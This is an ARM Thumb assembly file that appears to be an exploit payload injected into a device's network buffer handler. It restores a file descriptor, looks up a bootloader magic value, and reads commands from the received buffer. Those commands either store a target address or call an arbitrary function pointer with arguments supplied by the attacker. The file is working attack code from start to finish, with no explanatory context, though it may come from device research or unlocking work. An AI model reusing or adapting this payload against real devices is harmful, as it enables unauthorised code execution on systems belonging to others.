.thumb
.syntax unified
.globl _start

// detect 0xFF at lan->buf[0xFC]
// r4/r5 == lan->buf + 0xF8 == lan + 0xFC
_start:
	push {r0, r4-r7, lr}

	// r6 = lan->buf[0xFC]
	adds r7, r4, #0x04
	ldr r6, [r7]
	cmp r6, #0xFF
	beq prepare
	adds r7, r5, #0x04

// r7 == lan->buf + 0xFC
prepare:
	// r7 = lan->buf + 0xF0
	subs r7, 0x0C
	// r4 = lan->buf[0xF0] - lan->fd
	// r5 = lan->buf[0xF4] - bootloader magic address
	// r6 = lan->buf[0xF8] - target storage address
	// r7 = lan->buf + 0xFC == lan + 0x100
	ldm r7!, {r4, r5, r6}

	// store at lan->fd (lan + 0x144)
	str r4, [r7, #0x44]
	// load bootloader magic
	ldr r5, [r5]

	// set command buffer pointer (lan->buf + 0x48)
	subs r7, #0xB4

// r4 == lan->buf + 0x48
parse:
	// load next word from buffer
	// r0 = magic		/ command word
	// r1 = target addr	/ arg1
	// r7 = r7 + 8
	ldmia r7!, {r0, r1}
	// check command word
	cmp r0, #0x02
	// 0x00/0x01 - run target
	blo run
	// 0x02 - finish
	beq finish
	// anything else - detect BL type

search:
	// compare with magic from buffer
	cmp r0, r5
	// search again if not matching
	bne parse

store:
	// store target addr (r1) somewhere
	str r1, [r6]
	b finish

run:
	// r0 = lan->buf[0x48] - target type (0x00/0x01)
	// r1 = lan->buf[0x4C] - arg1
	// r7 = lan->buf + 0x50

	// load target address
	ldr r3, [r6]

	// check target type
	cmp r0, #0x01
	beq run_ptr

run_int:
	// r0 = lan->buf[0x4C] - arg1
	// r3 = *(target)
	movs r0, r1
	b run_branch

run_ptr:
	// r0 = lan->buf + 0x54
	// r1 = lan->buf[0x4C] - arg1
	// r2 = lan->buf[0x50] - arg2
	// r3 = *(target)
	ldmia r7!, {r2}
	movs r0, r7

run_branch:
	blx r3

finish:
	pop {r0, r4-r7, pc}
